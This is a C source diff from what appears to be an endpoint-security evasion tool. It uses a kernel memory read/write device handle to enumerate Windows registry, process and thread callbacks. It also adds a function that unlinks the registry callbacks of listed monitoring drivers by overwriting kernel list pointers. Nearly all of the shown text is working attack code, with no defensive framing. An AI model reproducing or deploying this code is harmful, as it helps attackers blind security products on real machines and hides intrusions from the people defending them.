@@ -67,18 +67,16 @@ VOID SearchModule(ULONG64 Address, ModulesData* module) {
 	DWORD dwBytesNeeded = 0;
 
 	dwBytesNeeded = 1024 * 8;
-	int nDrivers = 0;
-
 
 
 	if (!EnumDeviceDrivers(drivers, dwBytesNeeded, &dwBytesNeeded)) {
 		wprintf(L"[-] Couldn't EnumDeviceDrivers.\n");
 		return;
 	}
+	int nDrivers = (int)(dwBytesNeeded / sizeof(drivers[0]));
 
-	nDrivers = sizeof(drivers) / sizeof(drivers[0]);
 
-	printf("Num of loaded drivers: %d\n", nDrivers);
+	//printf("Num of loaded drivers: %d\n", nDrivers);
 	LPVOID temp = NULL;
 
 	CHAR driverName[MAX_PATH];
@@ -105,7 +103,7 @@ VOID SearchModule(ULONG64 Address, ModulesData* module) {
 	for (size_t i = 0; i < nDrivers-1; i++) {
 		if ((ULONG64)drivers[i] <= Address && (ULONG64)drivers[i + 1] > Address) {
 			if (GetDeviceDriverBaseNameA(drivers[i], driverName, sizeof(driverName))) {
-				printf("Found %s  at  %llx\n", driverName, drivers[i]);
+				//printf("Found %s  at  %llx\n", driverName, drivers[i]);
 
 				module->moduleBase = (ULONG64)drivers[i];
 				strcpy(module->moduleName, driverName);
@@ -236,16 +234,11 @@ VOID ListRegCallback(HANDLE hDevice) {
 		ReadN(hDevice, currListEntry, sizeof(REGISTRY_CALLBACK_ITEM), entry);
 		castedEntry = (REGISTRY_CALLBACK_ITEM*)entry;
 
-		currListEntry = (DWORD64)castedEntry->Item.Flink;
 
-		
 		//printf("currListEntry: flink  0x%llx\n", castedEntry->Item.Flink);
 		//printf("currListEntry: blink  0x%llx\n", castedEntry->Item.Blink);
 		//printf("currListEntry: Context  0x%llx\n", castedEntry->Context);
 		//printf("currListEntry: Function  0x%llx\n", castedEntry->Function);
-		if ((DWORD64)castedEntry->Item.Flink == listHead) {
-			break;
-		}
 		if (castedEntry->Function) {
 			moduleFuncAddr = castedEntry->Function;
 		}
@@ -258,11 +251,77 @@ VOID ListRegCallback(HANDLE hDevice) {
 		if (moduleInfo.moduleBase) {
 			printf("Found reg callback by: %s\n", moduleInfo.moduleName);
 		}
+
+		currListEntry = (DWORD64)castedEntry->Item.Flink;
 		castedEntry = (REGISTRY_CALLBACK_ITEM*)castedEntry->Item.Flink;
+
+
+		if ((DWORD64)currListEntry == listHead) {
+			break;
+		}
+
 	}
 	free(entry);
+}
+
+VOID ListObjCallback(HANDLE hDevice) {
+	int max_entries = 64;
+	DWORD64 procCallbackListHead = EzPdbGetRva(&pdb, "PsProcessType");
+	DWORD64 threadCallbackListHead = EzPdbGetRva(&pdb, "PsThreadType");
+
+	DWORD64 internalOffset = EzPdbGetStructPropertyOffset(&pdb, "_OBJECT_TYPE", L"CallbackList");
 
 
+	DWORD64 procListHead = (DWORD64)ntoskrnlBase + procCallbackListHead + internalOffset;
+	DWORD64 threadListHead = (DWORD64)ntoskrnlBase + threadCallbackListHead + internalOffset;
+
+	printf("procCallBackListHead at address: %llx\n", procListHead);
+	printf("procCallBackListHead at address: %llx\n", threadListHead);
+
+	printf("Press any key to continue\n");
+	getchar();
+	ModulesData moduleInfo = { 0 };
+	DWORD64 moduleFuncAddr;
+
+	DWORD64 currListEntry = procListHead;
+	BYTE* entry = (BYTE*)malloc(sizeof(REGISTRY_CALLBACK_ITEM));
+	REGISTRY_CALLBACK_ITEM* castedEntry = (REGISTRY_CALLBACK_ITEM*)entry;
+
+	int i = 0;
+	for (size_t i = 0; i < max_entries; i++) {
+		
+		ReadN(hDevice, currListEntry, sizeof(REGISTRY_CALLBACK_ITEM), entry);
+		castedEntry = (REGISTRY_CALLBACK_ITEM*)entry;
+
+
+		printf("currListEntry: flink  0x%llx\n", castedEntry->Item.Flink);
+		printf("currListEntry: blink  0x%llx\n", castedEntry->Item.Blink);
+		printf("currListEntry: Context  0x%llx\n", castedEntry->Context);
+		printf("currListEntry: Function  0x%llx\n", castedEntry->Function);
+	
+		if (castedEntry->Function) {
+			moduleFuncAddr = castedEntry->Function;
+		}
+		else if (castedEntry->Context) {
+			moduleFuncAddr = castedEntry->Context;
+		}
+		printf("Searching callback for addr: %llx\n", moduleFuncAddr);
+		SearchModule(moduleFuncAddr, &moduleInfo);
+
+		if (moduleInfo.moduleBase) {
+			printf("Found obj callback by: %s\n", moduleInfo.moduleName);
+		}
+
+		currListEntry = (DWORD64)castedEntry->Item.Flink;
+		castedEntry = (REGISTRY_CALLBACK_ITEM*)castedEntry->Item.Flink;
+
+
+		if ((DWORD64)currListEntry == procListHead) {
+			break;
+		}
+
+	}
+	free(entry);
 }
 
 //		CALLBACK DELETING FUNCTIONS
@@ -405,4 +464,72 @@ VOID DeleteLoadImageCallback(HANDLE hDevice) {
 		//printf("[%d] ModuleBase: %llx, ModuleName: %s\n\n", i, moduleInfo.moduleBase, moduleInfo.moduleName);
 
 	}
+}
+
+VOID DeleteRegCallback(HANDLE hDevice) {
+	int max_entries = 64;
+	DWORD64 CallbackListHead = EzPdbGetRva(&pdb, "CallbackListHead");
+
+	DWORD64 listHead = (DWORD64)ntoskrnlBase + CallbackListHead;
+
+	printf("CallBackListHead at address: %llx\n", listHead);
+	printf("Press any key to continue\n");
+	getchar();
+	ModulesData moduleInfo = { 0 };
+	DWORD64 moduleFuncAddr;
+
+	DWORD64 currListEntry = listHead;
+	BYTE* entry = (BYTE*)malloc(sizeof(REGISTRY_CALLBACK_ITEM));
+	REGISTRY_CALLBACK_ITEM* castedEntry = (REGISTRY_CALLBACK_ITEM*)entry;
+
+	int i = 0;
+	for (size_t i = 0; i < max_entries; i++) {
+		// moduleFuncAddr = Read64(hDevice, curr)
+		ReadN(hDevice, currListEntry, sizeof(REGISTRY_CALLBACK_ITEM), entry);
+		castedEntry = (REGISTRY_CALLBACK_ITEM*)entry;
+
+
+
+		if (castedEntry->Function) {
+			moduleFuncAddr = castedEntry->Function;
+		}
+		else if (castedEntry->Context) {
+			moduleFuncAddr = castedEntry->Context;
+		}
+		SearchModule(moduleFuncAddr, &moduleInfo);
+
+		if (moduleInfo.moduleBase) {
+			for (size_t k = 0; k < 104; k++) {
+				if (_strcmpi(moduleInfo.moduleName, monitoredDrivers[k]) == 0) {
+					printf("Deleting reg callback entry for: %s\n", moduleInfo.moduleName);
+					DWORD64 addr1 = (DWORD64)castedEntry->Item.Blink;
+					DWORD64 addr2 = (DWORD64)castedEntry->Item.Flink + 0x8; // blink
+
+
+					DWORD64 addrmio1 = currListEntry;
+					DWORD64 addrmio2 = currListEntry + 0x8;
+					
+					// unlinko
+					Write64(hDevice, addr1, (DWORD64)castedEntry->Item.Flink);
+					Write64(hDevice, addr2, (DWORD64)castedEntry->Item.Blink);
+
+					//sovrascrivo quelli nella mia struct
+					Write64(hDevice, addrmio1, (DWORD64)currListEntry);
+					Write64(hDevice, addrmio2, (DWORD64)currListEntry);
+					
+					
+				}
+			}
+		}
+
+		currListEntry = (DWORD64)castedEntry->Item.Flink;
+		castedEntry = (REGISTRY_CALLBACK_ITEM*)castedEntry->Item.Flink;
+
+
+		if ((DWORD64)currListEntry == listHead) {
+			break;
+		}
+
+	}
+	free(entry);
 }
